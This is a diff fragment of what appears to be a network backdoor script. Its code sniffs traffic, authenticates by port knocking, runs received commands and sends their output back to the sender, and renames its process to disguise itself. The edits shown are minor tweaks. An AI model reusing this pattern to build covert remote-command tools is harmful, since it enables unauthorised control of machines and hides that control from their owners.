@@ -122,7 +122,7 @@ def run_cmd(packet, cmd):
         output.append(out)
     if(err):
         output.append(err)
-    time.sleep(0.1)
+    time.sleep(0.5)
     send_data(''.join(output), packet[1].src, packet[2].sport, "print")
     print("Finished")
 
@@ -205,8 +205,7 @@ def port_knock_auth(packet):
 
 
 def main():
-    print("Sniffing for traffic...")
-    print("Sniffing {}".format(args.proto))
+    print("Sniffing for {} traffic...".format(args.proto))
     sniff(filter=args.proto.lower(), iface=args.iface, prn=port_knock_auth)
 
 
@@ -219,7 +218,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
     if(args.dname is not None):
         import setproctitle
-        setproctitle.setproctitle(args.pname)
+        setproctitle.setproctitle(args.dname)
     if(args.proto is not None):
         if(args.proto.lower() not in ["tcp", "udp"]):
             exit("Invalid protocol specified")
